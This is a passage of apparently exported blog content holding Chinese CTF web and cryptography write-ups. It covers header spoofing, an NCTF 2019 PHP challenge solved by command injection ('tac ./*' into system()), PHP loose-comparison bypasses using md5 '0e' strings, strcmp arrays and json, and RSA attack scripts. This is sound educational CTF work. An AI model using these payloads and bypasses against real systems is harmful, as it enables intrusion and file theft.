class="line"><span class="keyword">if</span>( function_exists(<span class="variable">$a</span>))&#123;</span><br><span class="line">	<span class="variable">$a</span>();</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="built_in">print</span> &lt;&lt;&lt;DBAPP</span><br></pre></td></tr></table></figure><br>构造?ctf=phpinfo<br>拿到flag{fc4e4034aafc11936d9a099c1867a355}</p>
<h2 id="又是空白页"><a href="#又是空白页" class="headerlink" title="又是空白页"></a>又是空白页</h2><p>burpsuite抓包，修改X-Forwarded-For:127.0.0.1,拿到 flag{96a2dd4632fffcefb6226a3b56017f0b}</p>
<h2 id="iphone5"><a href="#iphone5" class="headerlink" title="iphone5"></a>iphone5</h2><p>题目叙述：屌丝没有苹果，手机都买不起，咋办？室友的iphone6好眼馋，某些网站也只有手机打得开(答案为flag{}形式，提交{}中内容即可)<br>，题目意思是要用苹果的浏览器来访问这个网页，burpsuite抓包修改UA为ios6的代理<br>ios6的UA：Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A403 Safari/8536.25<br>拿到flag{a2a7c20140d7520903a70e4d282870df}</p>
<h2 id="被劫持的神秘礼物"><a href="#被劫持的神秘礼物" class="headerlink" title="被劫持的神秘礼物"></a>被劫持的神秘礼物</h2><p>题目叙述：某天小明收到了一件很特别的礼物，有奇怪的后缀，奇怪的名字和格式。小明找到了知心姐姐度娘，度娘好像知道这是啥，但是度娘也不知道里面是啥。。。你帮帮小明？找到帐号密码，串在一起，用32位小写MD5哈希一下得到的就是答案。<br>wireshark打开后，把http过滤出来，追踪tcp流<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">name=admina&amp;word=adminb</span><br></pre></td></tr></table></figure><br>账号为admina,密码为adminb<br>对adminaadminb进行md5加密，1d240aafe21a86afc11f38a45b541a49</p>
]]></content>
      <categories>
        <category>CTF-Web-WriteUp</category>
      </categories>
  </entry>
  <entry>
    <title>NCTF 2019 Web复现</title>
    <url>/post/cdb44740.html</url>
    <content><![CDATA[<h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><p>代码分为三块<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__file__);</span><br><span class="line"><span class="variable">$string_1</span> = <span class="variable">$_GET</span>[<span class="string">'str1'</span>];</span><br><span class="line"><span class="variable">$string_2</span> = <span class="variable">$_GET</span>[<span class="string">'str2'</span>];</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">'q_w_q'</span>];</span><br></pre></td></tr></table></figure><br>第一块<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">'num'</span>] !== <span class="string">'23333'</span> &amp;&amp; preg_match(<span class="string">'/^23333$/'</span>, <span class="variable">$_GET</span>[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">'1st ok'</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    die(<span class="string">'23333333'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>preg_match函数用于执行正则表达式的匹配：<br><a href="https://www.runoob.com/php/php-preg_match.html" target="_blank" rel="noopener">https://www.runoob.com/php/php-preg_match.html</a><br>preg_match(‘/^23333$/‘, $_GET[‘num’])<br>其中有两个特别的字符’^’，’$’<br>“^abc”:匹配以”abc”开头的字符串；<br>“abc$”:匹配以”abc”结尾的字符串；<br>“^abc$”:匹配以”abc”开头和以”abc”结尾的字符串，显然只有字符串”abc”符合要求<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[<span class="string">'num'</span>] !== <span class="string">'23333'</span> &amp;&amp; preg_match(<span class="string">'/^23333$/'</span>, <span class="variable">$_GET</span>[<span class="string">'num'</span>]</span><br></pre></td></tr></table></figure><br>这里的preg_match(‘/^23333$/‘, $_GET[‘num’]要求结果为真，即num=23333,但是$_GET[‘num’] !== ‘23333’又不让num=23333，只能用%0a截断了<br>构造num=23333%0a，第一关算是过了<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(is_numeric(<span class="variable">$string_1</span>))&#123;</span><br><span class="line">    <span class="variable">$md5_1</span> = md5(<span class="variable">$string_1</span>);</span><br><span class="line">    <span class="variable">$md5_2</span> = md5(<span class="variable">$string_2</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$md5_1</span> != <span class="variable">$md5_2</span>)&#123;</span><br><span class="line">        <span class="variable">$a</span> = strtr(<span class="variable">$md5_1</span>, <span class="string">'cxhp'</span>, <span class="string">'0123'</span>);</span><br><span class="line">        <span class="variable">$b</span> = strtr(<span class="variable">$md5_2</span>, <span class="string">'cxhp'</span>, <span class="string">'0123'</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$a</span> == <span class="variable">$b</span>)&#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">'2nd ok'</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            die(<span class="string">"can u give me the right str???"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        die(<span class="string">"no!!!!!!!!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    die(<span class="string">'is str1 numeric??????'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>strtr函数转换字符串中特定的字符：<br><a href="https://www.runoob.com/php/func-string-strtr.html" target="_blank" rel="noopener">https://www.runoob.com/php/func-string-strtr.html</a><br>strtr(“abcde”,”ad”,”12”);//结果返回1bc2e，即a-&gt;1,d-&gt;2<br>此处代码意思是<br>str1 -&gt; string_1 -&gt; md5_1=md5(str1) &amp;&amp; md5_1中的’cxhp’替换为’0123’ -&gt; a<br>str2 -&gt; string_2 -&gt; md5_2=md5(str2) &amp;&amp; md5_2中的’cxhp’替换为’0123’ -&gt; b<br>要求 a==b,显然要找两个md5后以”ce”开头，因为替换后就会以”0e开头”，那样a==b就成立了<br>接下来的问题就是如何找这样两个字符串<br>参考链接:<a href="https://ctftime.org/writeup/8702" target="_blank" rel="noopener">https://ctftime.org/writeup/8702</a><br>然后我写了个python脚本跑了一下<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">count1=0</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(0,100000000000): </span><br><span class="line">    stra=str(j)</span><br><span class="line">    m2 = hashlib.md5()</span><br><span class="line">    m2.update(stra.encode(<span class="string">"utf-8"</span>)) </span><br><span class="line">    stra2=m2.hexdigest()</span><br><span class="line">    str3=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> stra2:</span><br><span class="line">        <span class="keyword">if</span> i==<span class="string">'c'</span>:str3+=<span class="string">'0'</span></span><br><span class="line">        <span class="keyword">elif</span> i==<span class="string">'x'</span>:str3+=<span class="string">'1'</span></span><br><span class="line">        <span class="keyword">elif</span> i==<span class="string">'h'</span>:str3+=<span class="string">'2'</span></span><br><span class="line">        <span class="keyword">elif</span> i==<span class="string">'p'</span>:str3+=<span class="string">'3'</span></span><br><span class="line">        <span class="keyword">else</span>:str3+=i</span><br><span class="line">    try:</span><br><span class="line">        <span class="keyword">if</span> int(str3[3:]):</span><br><span class="line">            <span class="keyword">if</span> (stra2[:2]==<span class="string">"0e"</span>):</span><br><span class="line">                <span class="built_in">print</span>(stra+<span class="string">"   MD5替换后为  "</span>+stra2)</span><br><span class="line">                count1+=1</span><br><span class="line">    except ValueError: n=1</span><br><span class="line">    <span class="keyword">if</span> count1==2:<span class="built_in">break</span></span><br></pre></td></tr></table></figure><br>得到了两个结果：2120624 和 9081940<br>构造str1=2120624&amp;str2=9081940<br>第二关结束<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="variable">$_SERVER</span>[<span class="string">'QUERY_STRING'</span>];</span><br><span class="line"><span class="keyword">if</span> (strlen(<span class="variable">$cmd</span>) &gt; 8)&#123;</span><br><span class="line">    die(<span class="string">"too long :("</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (substr_count(<span class="variable">$query</span>, <span class="string">'_'</span>) === 0 &amp;&amp; substr_count(<span class="variable">$query</span>, <span class="string">'%5f'</span>) === 0 )&#123;</span><br><span class="line">    <span class="variable">$arr</span> = explode(<span class="string">' '</span>, <span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$arr</span>[0] !== <span class="string">'ls'</span> || <span class="variable">$arr</span>[0] !== <span class="string">'pwd'</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(substr_count(<span class="variable">$cmd</span>, <span class="string">'cat'</span>) === 0)&#123;</span><br><span class="line">            system(<span class="variable">$cmd</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            die(<span class="string">'ban cat :) '</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        die(<span class="string">'bad guy!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    die(<span class="string">'nonono _ is bad'</span>);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>$_SERVER[‘QUERY_STRING’]:获取查询，得到的时url中?后面的值<br>例如：<a href="https://zxfireworks.github.io?a=123&amp;b=456" target="_blank" rel="noopener">https://zxfireworks.github.io?a=123&amp;b=456</a><br>那么$_SERVER[‘QUERY_STRING’]=”a=123&amp;b=456”<br>参考链接：<a href="https://www.cnblogs.com/sanwenyu/p/4573943.html" target="_blank" rel="noopener">https://www.cnblogs.com/sanwenyu/p/4573943.html</a></p>
<p>substr_count() 函数计算子串在字符串中出现的次数<br>substr_count(string,substring,start,length)<br>参数string:被检索的字符串<br>    substring:要检索的字符串<br>参考链接：<a href="https://www.w3school.com.cn/php/func_string_substr_count.asp" target="_blank" rel="noopener">https://www.w3school.com.cn/php/func_string_substr_count.asp</a></p>
<p>explode() 函数把字符串打散为数组</p>
<p>构造q.w.q=tac%20./*</p>
]]></content>
      <categories>
        <category>CTF-Web-WriteUp</category>
      </categories>
  </entry>
  <entry>
    <title>php弱类型</title>
    <url>/post/e22fda54.html</url>
    <content><![CDATA[<p>PHP中由两个比较符号：== 和 ===<br>== 在进行比较时，会先将两个字符串的类型转为同一类型，然后比较值，若有一方为字符串或为空，会先把非数字一方转换为0，再做比较<br>=== 在比较时，会先判断两个字符串的类型是否一样，再比较值是否一样<br>如果是数字和字符串比较，或者是比较的字符串中含有数字的，那么字符串会先被转换为数值，然后再比较数值<br>特别的：0e开头且0e以后的全为数字的字符串在判断==时，均会转换为0</p>
<h2 id="比较时字符串转换问题"><a href="#比较时字符串转换问题" class="headerlink" title="== 比较时字符串转换问题"></a>== 比较时字符串转换问题</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$a1</span>=0;</span><br><span class="line"><span class="variable">$b1</span>=<span class="string">"abc"</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a1</span>==<span class="variable">$b1</span>) // <span class="string">"abc"</span>会被转换为0，a1==b1==0,结果为真</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"true"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"false"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a2</span>=23;</span><br><span class="line"><span class="variable">$b2</span>=<span class="string">"abc"</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span>==<span class="variable">$b</span>) // <span class="string">"abc"</span>会被转换为0，但(a2=23) != (b=0),结果为假</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"true"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"false"</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h2 id="MD5绕过"><a href="#MD5绕过" class="headerlink" title="MD5绕过"></a>MD5绕过</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$md51</span> = md5(<span class="string">'240610708'</span>);</span><br><span class="line"><span class="variable">$a</span> = @<span class="variable">$_GET</span>[<span class="string">'a'</span>];</span><br><span class="line"><span class="variable">$md52</span> = @md5(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$a</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$a</span> != <span class="string">'QNKCDZO'</span> &amp;&amp; <span class="variable">$md51</span>==<span class="variable">$md52</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"false!!!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>用get方法传入一个参数a,要让md5(‘240610708’)==md5(a)成立，且a!=QNKCDZO,而md5(‘240610708’)=0e462097431906509019562988736854，根据上面关于字符串与数值比较分析，此处0e462097431906509019562988736854转换为数值后的结果为0，所以只需要找一个md5以后以0e开头的字符串即可<br>例子：QNKCDZO 240610708 s878926199a s155964671a s214587387a s214587387a</p>
<h2 id="strcmp绕过"><a href="#strcmp绕过" class="headerlink" title="strcmp绕过"></a>strcmp绕过</h2><p>strcmp（string $str1,string $str2）<br>如果 str1 小于 str2 ，返回 &lt; 0;<br>如果 str1 大于 str2 ，返回 &gt; 0;<br>如果两者相等，返回0；<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="built_in">echo</span> strcmp(<span class="string">"abc"</span>,<span class="string">"abc"</span>);//相等</span><br><span class="line"><span class="built_in">echo</span> strcmp(<span class="string">"abc"</span>,<span class="string">"abcde"</span>);//abc 小于 abcde</span><br><span class="line"><span class="built_in">echo</span> strcmp(<span class="string">"abcde"</span>,<span class="string">"abc"</span>);//abcde 大于 abc</span><br><span class="line"><span class="built_in">echo</span> strcmp(<span class="string">"abc"</span>,<span class="string">"abC"</span>);//abc 小于 abC</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>在php5.2之前，strcmp(数组,字符串);结果返回-1<br>在php5.3开始，strcmp(数组,字符串);结果返回0<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(<span class="string">'flag.php'</span>)</span><br><span class="line"><span class="variable">$flag</span>=<span class="string">'&#123;***************&#125;'</span></span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">'password'</span>])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (strcmp(<span class="variable">$_GET</span>[<span class="string">'password'</span>],<span class="variable">$flag</span>)==0)</span><br><span class="line">        die(<span class="string">'Flag:'</span>.<span class="variable">$flag</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">'Invalid pasword'</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>$_GET[‘password’],$flag)==0,此处并不知道flag的值是多少，但是只要结果为0即可，所以可以构造一个数组password[]=123,这样就会返回一个0了</p>
<h2 id="json绕过"><a href="#json绕过" class="headerlink" title="json绕过"></a>json绕过</h2><p>先初步了解了一下<br>json:<a href="https://www.runoob.com/json/json-tutorial.html" target="_blank" rel="noopener">https://www.runoob.com/json/json-tutorial.html</a><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_POST</span>[<span class="string">'message'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$message</span> = json_decode(<span class="variable">$_POST</span>[<span class="string">'message'</span>]);</span><br><span class="line">    <span class="variable">$key</span> = <span class="string">"*********"</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$message</span>-&gt;key == <span class="variable">$key</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"flag"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"fail"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"~~~~"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>json_decode: 对JSON格式的字符串进行解码，接受一个JSON编码的字符串并且把它转换为PHP变量<br>json_decode(string $json[,bool $assoc = FALSE[,int $depth = 512[,int $options = 0]]])<br>其中第二个参数assoc设置为true时，将会返回一个数组array,否则返回一个对象object<br>此处并不知道key的值，key在比较时转换失败返回0，那么就可以构造一个键值对message{“key”:0}进行绕过</p>
]]></content>
      <categories>
        <category>CTF-Web-WriteUp</category>
      </categories>
  </entry>
  <entry>
    <title>RSA常见攻击方法</title>
    <url>/post/d6f244fa.html</url>
    <content><![CDATA[<h3 id="RSA-p-q-e"><a href="#RSA-p-q-e" class="headerlink" title="RSA(p,q,e)"></a>RSA(p,q,e)</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p =gmpy2.mpz(<span class="number">9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span>)</span><br><span class="line">q =gmpy2.mpz(<span class="number">11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span>)</span><br><span class="line">e =gmpy2.mpz(<span class="number">65537</span>)</span><br><span class="line">phi_n= (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi_n)</span><br><span class="line">print(<span class="string">"d is:"</span>)</span><br><span class="line"><span class="keyword">print</span> (d)</span><br></pre></td></tr></table></figure>
<h3 id="rsarsa-p-q-e-c"><a href="#rsarsa-p-q-e-c" class="headerlink" title="rsarsa(p,q,e,c)"></a>rsarsa(p,q,e,c)</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p =gmpy2.mpz(<span class="number">9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span>)</span><br><span class="line">q =gmpy2.mpz(<span class="number">11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span>)</span><br><span class="line">e =gmpy2.mpz(<span class="number">65537</span>)</span><br><span class="line">phi_n= (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi_n)</span><br><span class="line">c=<span class="number">83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span></span><br><span class="line">n = p * q</span><br><span class="line">m = pow(c,d,n)</span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure>
<h3 id="RSA1-dp-amp-dq泄露"><a href="#RSA1-dp-amp-dq泄露" class="headerlink" title="RSA1(dp&amp;dq泄露)"></a>RSA1(dp&amp;dq泄露)</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(dp,dq,p,q,c)</span>:</span></span><br><span class="line">  InvQ = gmpy2.invert(q,p)</span><br><span class="line">  mp = pow(c,dp,p)</span><br><span class="line">  mq = pow(c,dq,q)</span><br><span class="line">  m=(((mp-mq)*InvQ)%p)*q+mq</span><br><span class="line">  <span class="keyword">print</span> (binascii.unhexlify(hex(m)[<span class="number">2</span>:]))</span><br><span class="line">p = <span class="number">8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229</span> </span><br><span class="line">q = <span class="number">12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469</span> </span><br><span class="line">dp = <span class="number">6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929</span> </span><br><span class="line">dq = <span class="number">783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041</span> </span><br><span class="line">c = <span class="number">24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span></span><br><span class="line">decrypt(dp,dq,p,q,c)</span><br></pre></td></tr></table></figure>
<h3 id="RSA3-共模攻击"><a href="#RSA3-共模攻击" class="headerlink" title="RSA3(共模攻击)"></a>RSA3(共模攻击)</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gp</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exgcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> b==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">    x2, y2, r = exgcd(b, a%b)</span><br><span class="line">    x1 = y2</span><br><span class="line">    y1 = x2-(a//b)*y2</span><br><span class="line">    <span class="keyword">return</span> x1, y1, r</span><br><span class="line"></span><br><span class="line">n=gp.mpz(<span class="number">22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801</span>)</span><br><span class="line">c1=gp.mpz(<span class="number">22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361</span>)</span><br><span class="line">c2=gp.mpz(<span class="number">18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397</span>)</span><br><span class="line">e1=gp.mpz(<span class="number">11187289</span>)</span><br><span class="line">e2=gp.mpz(<span class="number">9647291</span>)</span><br><span class="line"></span><br><span class="line">r1, r2, t = exgcd(e1, e2)</span><br><span class="line">m = gp.powmod(c1, r1, n) * gp.powmod(c2, r2, n) % n</span><br><span class="line">print(bytes.fromhex(str(hex(m)[<span class="number">2</span>:])))</span><br></pre></td></tr></table></figure>
<h3 id="RSA2-dp泄露"><a href="#RSA2-dp泄露" class="headerlink" title="RSA2(dp泄露)"></a>RSA2(dp泄露)</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getd</span><span class="params">(n,e,dp)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,e):</span><br><span class="line">        <span class="keyword">if</span> (dp*e<span class="number">-1</span>)%i == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> n%(((dp*e<span class="number">-1</span>)//i)+<span class="number">1</span>)==<span class="number">0</span>:</span><br><span class="line">                p=((dp*e<span class="number">-1</span>)//i)+<span class="number">1</span></span><br><span class="line">                q=n//(((dp*e<span class="number">-1</span>)//i)+<span class="number">1</span>)</span><br><span class="line">                phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">                d = gmpy2.invert(e,phi)%phi</span><br><span class="line">                <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113</span></span><br><span class="line">c = <span class="number">140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751</span></span><br><span class="line">dp = <span class="number">905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657</span></span><br><span class="line"></span><br><span class="line">d=getd(n,e,dp)</span><br><span class="line">m=pow(c,d,n)</span><br><span class="line">print(binascii.unhexlify(hex(m)[<span class="number">2</span>:]))</span><br></pre></td></tr></table></figure>
<h3 id="RSA-pub-key-amp-flag-enc"><a href="#RSA-pub-key-amp-flag-enc" class="headerlink" title="RSA(pub.key&amp;flag.enc)"></a>RSA(pub.key&amp;flag.enc)</h3><p>通过公钥文件pub.key获取n和e<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line">public = RSA.importKey(open(<span class="string">"pub.key"</span>).read())</span><br><span class="line">n = public.n</span><br><span class="line">e = public.e</span><br><span class="line">print(<span class="string">"n=\n%s\ne=\n%s"</span>%(n,e))</span><br></pre></td></tr></table></figure><br>n=86934482296048119190666062003494800588905656017203025617216654058378322103517<br>e=65537<br>分解n<br><a href="http://www.factordb.com/" target="_blank" rel="noopener">http://www.factordb.com/</a><br>p= 285960468890451637935629440372639283459<br>q= 304008741604601924494328155975272418463<br>求出d=81176168860169991027846870170527607562179635470395365333547868786951080991441<br>通过私钥解出明文<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">86934482296048119190666062003494800588905656017203025617216654058378322103517</span></span><br><span class="line">p = <span class="number">285960468890451637935629440372639283459</span></span><br><span class="line">q = <span class="number">304008741604601924494328155975272418463</span></span><br><span class="line">d = <span class="number">81176168860169991027846870170527607562179635470395365333547868786951080991441</span></span><br><span class="line"></span><br><span class="line">key = rsa.PrivateKey(n,e,d,q,p)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'flag.enc'</span>,<span class="string">'rb'</span>)<span class="keyword">as</span> data:</span><br><span class="line">    data = data.read()</span><br><span class="line">    print(rsa.decrypt(data,key))</span><br></pre></td></tr></table></figure></p>
<h3 id="RSAROLL-n很小，直接分解"><a href="#RSAROLL-n很小，直接分解" class="headerlink" title="RSAROLL(n很小，直接分解)"></a>RSAROLL(n很小，直接分解)</h3><p>分解n<br>p=18443<br>q=49891<br>已知p,q,e求出私钥d=96849619<br>已知c,d,n求出明文<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">d=<span class="number">96849619</span></span><br><span class="line">n=<span class="number">920139713</span></span><br><span class="line">cipher=<span class="string">"""</span></span><br><span class="line"><span class="string">704796792</span></span><br><span class="line"><span class="string">752211152</span></span><br><span class="line"><span class="string">274704164</span></span><br><span class="line"><span class="string">18414022</span></span><br><span class="line"><span class="string">368270835</span></span><br><span class="line"><span class="string">483295235</span></span><br><span class="line"><span class="string">263072905</span></span><br><span class="line"><span class="string">459788476</span></span><br><span class="line"><span class="string">483295235</span></span><br><span class="line"><span class="string">459788476</span></span><br><span class="line"><span class="string">663551792</span></span><br><span class="line"><span class="string">475206804</span></span><br><span class="line"><span class="string">459788476</span></span><br><span class="line"><span class="string">428313374</span></span><br><span class="line"><span class="string">475206804</span></span><br><span class="line"><span class="string">459788476</span></span><br><span class="line"><span 